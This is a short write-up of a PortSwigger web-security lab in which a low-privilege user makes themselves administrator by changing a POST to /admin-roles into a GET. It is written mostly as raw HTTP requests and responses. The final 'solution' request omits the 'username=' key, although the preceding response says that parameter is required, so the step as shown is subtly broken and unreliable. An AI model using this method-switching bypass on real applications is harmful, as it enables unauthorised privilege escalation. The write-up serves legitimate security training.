# [Lab: Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)

This lab implements [access controls](https://portswigger.net/web-security/access-control) based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

## Analysis

upgrade user request at administrator account:

```http
POST /admin-roles HTTP/1.1
Cookie: session=adminsession

username=wiener&action=upgrade
```

repeat the request with `wiener` session, response:

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 14

"Unauthorized"
```

change http method:

```http
GET /admin-roles HTTP/1.1
Cookie: session=wienersession

```

- response:

  ```http
  HTTP/1.1 400 Bad Request
  Content-Type: application/json; charset=utf-8
  Connection: close
  Content-Length: 30

  "Missing parameter 'username'"
  ```

## Solution

add query parameter to the request:

```http
GET /admin-roles?wiener&action=upgrade HTTP/1.1
Cookie: session=wienersession

```

=> solved
